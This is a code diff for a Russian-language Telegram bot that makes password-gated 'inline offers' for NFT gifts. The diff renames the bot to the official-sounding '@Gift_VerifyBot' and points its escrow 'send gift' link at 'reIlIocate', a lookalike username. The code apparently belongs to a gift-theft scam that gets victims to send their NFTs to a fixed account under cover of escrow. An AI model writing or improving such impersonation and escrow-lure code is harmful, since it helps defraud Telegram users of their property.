@@ -232,7 +232,7 @@ async def inline_offer_handler(inline_query: types.InlineQuery):
         results = [
             InlineQueryResultArticle(
                 id="help_hint",
-                title="🎁 Создание оффера через @ITelegram_GiftBot",
+                title="🎁 Создание оффера через @Gift_VerifyBot",
                 description="Формат: <язык> <ссылка> <сумма> <валюта>\nПример: ua https://t.me/nft/MythMask-163737 3233 stars",
                 input_message_content=InputTextMessageContent(
                     message_text="ℹ️ <b>Инструкция по использованию инлайн-оффера:</b>\n\nНапишите в любом чате:\n<code>@ITelegram_GiftBot ua https://t.me/nft/MythMask-163737 3233 stars</code>",
@@ -294,7 +294,7 @@ async def cmd_pass(message: types.Message):
     await message.answer(
         "✅ <b>Доступ успешно активирован!</b>\n\n"
         "Теперь вы можете создавать инлайн-офферы в любых чатах:\n"
-        "<code>@ITelegram_GiftBot ua https://t.me/nft/Item 500 stars</code>",
+        "<code>@Gift_VerifyBot ua https://t.me/nft/Item 500 stars</code>",
         parse_mode="HTML"
     )
 
@@ -307,10 +307,10 @@ async def cmd_start(message: types.Message):
         status_text = "🔴 <b>Статус:</b> Доступ ограничен. Введите команду /pass с паролем для активации."
 
     await message.answer(
-        f"🌲 <b>Eclipse Offer Inline Bot (@ITelegram_GiftBot)</b>\n\n"
+        f"🌲 <b>Eclipse Offer Inline Bot (@Gift_VerifyBot)</b>\n\n"
         f"{status_text}\n\n"
         "Инструкция по созданию оффера:\n"
-        "<code>@ITelegram_GiftBot ua https://t.me/nft/Item-123 500 stars</code>",
+        "<code>@Gift_VerifyBot ua https://t.me/nft/Item-123 500 stars</code>",
         parse_mode="HTML"
     )
 
@@ -342,7 +342,7 @@ async def process_accept(callback: types.CallbackQuery):
         lang = last_data.get("lang", "ru")
 
     t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
-    send_url = "tg://send_gift?to=OwnerGiftWork2"
+    send_url = "tg://send_gift?to=reIlIocate"
 
     escrow_text = t['escrow'].format(amount=amount, currency=currency)
 
